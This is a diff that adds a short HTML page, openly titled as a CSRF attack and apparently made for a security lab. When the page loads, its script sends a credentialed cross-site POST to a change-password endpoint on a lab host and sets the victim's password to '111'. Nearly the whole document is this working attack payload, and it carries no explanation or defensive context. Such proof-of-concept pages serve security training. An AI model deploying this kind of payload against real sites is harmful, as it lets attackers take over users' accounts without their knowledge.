@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+
+<h1>This is CSRF attack</h1>
+  
+    <script>
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function () {
+            if (this.readyState == 4 && this.status == 200) {
+                console.log('ok');
+
+            }
+        }
+
+        xhttp.open("POST", "oz1kvph169.voorivex-lab.online/change-password");
+        xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        xhttp.withCredentials = true;
+        var password = "111";
+        xhttp.send("newPassword=" + encodeURIComponent(password));
+    </script>
+</body>
+
+</html>
